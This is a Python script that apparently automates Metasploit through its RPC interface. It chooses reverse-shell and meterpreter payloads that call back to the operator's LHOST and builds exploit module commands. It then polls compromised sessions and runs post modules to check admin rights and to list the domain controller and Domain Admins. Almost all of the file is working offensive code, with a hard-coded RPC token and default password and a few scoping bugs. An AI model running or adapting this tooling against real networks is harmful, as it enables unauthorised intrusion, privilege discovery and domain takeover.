#!/usr/bin/env python3

import re
import os
import sys
import time
import msfrpc
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError


def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-p", "--password", default='123', help="Password for msfrpc")
    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
    return parser.parse_args()

# Colored terminal output
def print_bad(msg):
    print((colored('[-] ', 'red') + msg))

def print_info(msg):
    print((colored('[*] ', 'blue') + msg))

def print_good(msg):
    print((colored('[+] ', 'green') + msg))

def print_great(msg):
    print((colored('[!] {}'.format(msg), 'yellow', attrs=['bold'])))

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
    '''
    You can set arbitrary options that don't get used which is why we autoinclude
    ExitOnSession True and SRVHOST (for JBoss); even if we use aux module this just won't do anything
    '''
    local_ip = get_local_ip(get_iface())
    print_info('Setting options on {}'.format(module_path))
    cmds = """
           set {} {}\n
           set RPORT {}\n
           set LHOST {}\n
           set SRVHOST {}\n
           set payload {}\n
           set ExitOnSession True\n
           {}\n
           """.format(rhost_var, ip, port, local_ip, local_ip, payload, extra_opts)

    return cmds

def get_req_opts(c_id, module):
    req_opts = []
    opts = CLIENT.call('module.options', [c_id, module])
    for opt_name in opts:
        if b'required' in opts[opt_name]:
            if opts[opt_name][b'required'] == True:
                if b'default' not in opts[opt_name]:
                    req_opts.append(opt_name.decode('utf8'))
    return req_opts

def get_rhost_var(c_id, req_opts):
    for o in req_opts:
        if 'RHOST' in o:
            return o

def get_payload(module, operating_sys, target_num):
    '''
    Automatically get compatible payloads
    '''
    payload = None
    payloads = []
    win_payloads = ['windows/meterpreter/reverse_https',
                    'windows/x64/meterpreter/reverse_https',
                    'java/meterpreter/reverse_https',
                    'java/jsp_shell_reverse_tcp']

    linux_payloads = ['generic/shell_reverse_tcp',
                      'java/meterpreter/reverse_https',
                      'java/jsp_shell_reverse_tcp',
                      'cmd/unix/reverse']
    if target_num:
        payloads_dict = CLIENT.call('module.target_compatible_payloads', [module, int(target_num)])
    else:
        payloads_dict = CLIENT.call('module.compatible_payloads', [module])

    if b'error' in payloads_dict:
        if 'auxiliary' not in module:
            print_bad('Error getting payload for {}'.format(module))
        else:
            # For aux modules we just set an arbitrary real payload
            payload = win_payloads[0]
    else:
        byte_payloads = payloads_dict[b'payloads']
        for p in byte_payloads:
            payloads.append(p.decode('utf8'))

    # Set a preferred payload based on OS
    if 'windows' in operating_sys.lower():
        for p in win_payloads:
            if p in payloads:
                payload = p
    elif 'linux' in operating_sys.lower():
        for p in linux_payloads:
            if p in payloads:
                payload = p

    # No preferred payload found. If aux module, just set it to rev_https bc it doesn't matter
    if payload == None:
        if 'auxiliary' not in module:
            print_bad('No preferred payload found, first and last comapatible payloads:')
            print('    '+payloads[0])
            print('    '+payloads[-1])
            print_info('Skipping this exploit')
            return

    return payload

def get_domain(info):
    split_info = info.split()
    dom_user = split_info[0]
    dom = dom_user.split('\\')[0]
    host = split_info[-1]
    if dom != host:
        return dom

def update_sess_data(CLIENT, domain_data, session, sess_num):
    info = session[b'info'].decode('utf8')
    domain = get_domain(info)

    if b'first_check' not in session:
        session[b'first_check'] = b'False'
        plat = session[b'platform'].decode('utf8')
        arch = session[b'arch'].decode('utf8')
        if domain:
            session[b'domain_joined'] = b'True'
            domain_data['domain'] = domain
        else:
            session[b'domain_joined'] = b'False'
        admin = is_admin(CLIENT, sess_num)
        session[b'admin'] = admin
        print_info(info+' '+plat+' '+arch)
        print('        Domain: '+domain.decode('utf8'))
        print('        Is admin: '+admin.decode('utf8'))

    return session, domain_data

def is_admin(CLIENT, sess_num):
    cmd = 'run post/windows/gather/win_privs'
    output = run_session_cmd(CLIENT, sess_num, cmd, None)

    if output:
        split_out = output.decode('utf8').splitlines()
        user_info_list = split_out[5].split()
        admin = user_info_list[0]
        system = user_info_list[1]
        in_local_admin = user_info_list[2]
        user = user_info_list[5]

        # Byte string
        return str(admin).encode()

    else:

        return b'ERROR'

def get_domain_controller(CLIENT, domain_data, sess_num):
    print_info('Getting domain controller...')
    cmd = 'run post/windows/gather/enum_domains'
    end_str = b'[+] Domain Controller:'
    output = run_session_cmd(CLIENT, sess_num, cmd, end_str).decode('utf8')
    if 'Domain Controller: ' in output:
        dc = output.split('Domain Controller: ')[-1].strip()
        domain_data['domain_controller'] = dc
        print_good('Domain controller: '+dc)
    else:
        print_bad('No domain controller found')

    return domain_data

def get_domain_admins(CLIENT, domain_data, sess_num):
    print_info('Getting domain admins...')
    cmd = 'run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"'
    end_str = b'[+] User list'
    output = run_session_cmd(CLIENT, sess_num, cmd, end_str).decode('utf8')
    da_line_start = '[*] \t'

    if da_line_start in output:
        split_output = output.splitlines()
        print_info('Domain admins:')

        domain_admins = []
        for l in split_output:
            if l.startswith(da_line_start):
                domain_admin = l.split(da_line_start)[-1].strip()
                domain_admins.append(domain_admin)
                print('        '+domain_admin)
        domain_data['domain_admins'] = domain_admins

    else:
        print_bad('No domain admins found')
        sys.exit()

    return domain_data

def get_domain_data(CLIENT, session, sess_num, domain_data):
    # Check if we did domain recon yet
    if domain_data['domain_controller'] == None:
        if session[b'domain_joined'] == b'True':
            domain_data = get_domain_controller(CLIENT, domain_data, sess_num)
            domain_data = get_domain_admins(CLIENT, domain_data, sess_num)

    return domain_data

def check_sessions(CLIENT, sessions, domain_data):
    if len(sessions) > 0:
        for s in sessions:
            
            # Get and print session info if first time we've checked the sess
            sessions[s], domain_data = update_sess_data(CLIENT, domain_data, sessions[s], s)
            domain_data = get_domain_data(CLIENT, sessions[s], s, domain_data)

    return sessions, domain_data

def run_session_cmd(CLIENT, sess_num, cmd, end_str):
    script_errors = [b'[-] Post Failed', b'Error in script']
    res = CLIENT.call('session.meterpreter_run_single', [str(sess_num), cmd])
    if res[b'result'] == b'success':

        counter = 0
        while True:
            time.sleep(2)
            output = CLIENT.call('session.meterpreter_read', [str(sess_num)])[b'data']

            if any(x in output for x in script_errors):
                return output

            # Check if the ending string is in output or if script errored
            elif end_str:
                if end_str in output:
                    return output

            # If no terminating string specified just wait 5m
            elif output == b'':
                counter += 1
                # Set default wait time to 5m
                if counter > 150:
                    return output

            else:
                return output
    else:
        print_bad(res[b'result'].decode('utf8'))
    
def get_perm_token(CLIENT):
    # Authenticate and grab a permanent token
    CLIENT.login(args.username, args.password)
    CLIENT.call('auth.token_add', ['123'])
    CLIENT.token = '123'
    return CLIENT

def main(args):

    CLIENT = msfrpc.Msfrpc({})
    CLIENT = get_perm_token(CLIENT)
    sessions = CLIENT.call('session.list')
    domain_data = {'domain':None, 'domain_controller':None, 'domain_admins':None}
    while True:
        sessions, domain_data = check_sessions(CLIENT, sessions, domain_data)
        print(domain_data) #1111
        time.sleep(.5)

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root')
        sys.exit()
    main(args)

